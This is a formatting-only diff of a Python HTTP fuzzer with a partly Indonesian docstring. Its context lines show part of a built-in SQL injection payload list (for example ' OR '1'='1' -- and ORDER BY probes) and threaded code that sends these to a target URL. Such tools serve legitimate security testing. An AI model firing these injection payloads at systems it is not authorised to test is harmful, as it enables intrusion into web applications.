@@ -4,18 +4,18 @@ HTTP Fuzzer - Fuzz HTTP parameters, headers, and paths
 Mengirim banyak request dengan payload untuk menemukan bug.
 Usage: python http_fuzzer.py -u http://target.com/page?id=FUZZ -w wordlist.txt
 """
+
 import requests
 import argparse
 import sys
 import time
 import concurrent.futures
 
-
 SQUID_FUZZ_PAYLOADS = [
     "'",
-    "\"",
+    '"',
     "' OR '1'='1",
-    "\" OR \"1\"=\"1",
+    '" OR "1"="1',
     "' OR '1'='1' --",
     "' OR '1'='1' /*",
     "1' ORDER BY 1--",
@@ -71,7 +71,9 @@ def main():
     parser.add_argument("-t", "--threads", type=int, default=20, help="Thread count")
     parser.add_argument("-d", "--delay", type=float, default=0, help="Delay between requests")
     parser.add_argument("--builtin", action="store_true", help="Use built-in payload list")
-    parser.add_argument("--show-code", default="all", help="Filter status codes (comma-separated or 'all')")
+    parser.add_argument(
+        "--show-code", default="all", help="Filter status codes (comma-separated or 'all')"
+    )
     args = parser.parse_args()
 
     if "FUZZ" not in args.url:
@@ -105,7 +107,9 @@ def main():
 
     found = []
     with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
-        future_to_payload = {executor.submit(fuzz_request, session, args.method, args.url, p): p for p in payloads}
+        future_to_payload = {
+            executor.submit(fuzz_request, session, args.method, args.url, p): p for p in payloads
+        }
         completed = 0
         for future in concurrent.futures.as_completed(future_to_payload):
             completed += 1
@@ -119,7 +123,9 @@ def main():
                     codes = args.show_code.split(",")
                     if str(result["status"]) not in codes:
                         continue
-                print(f"{result['payload'][:33]:<35}{result['status']:<10}{result['length']:<10}{result['time']:.2f}s")
+                print(
+                    f"{result['payload'][:33]:<35}{result['status']:<10}{result['length']:<10}{result['time']:.2f}s"
+                )
                 found.append(result)
 
     print("-" * 80)
@@ -128,4 +134,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
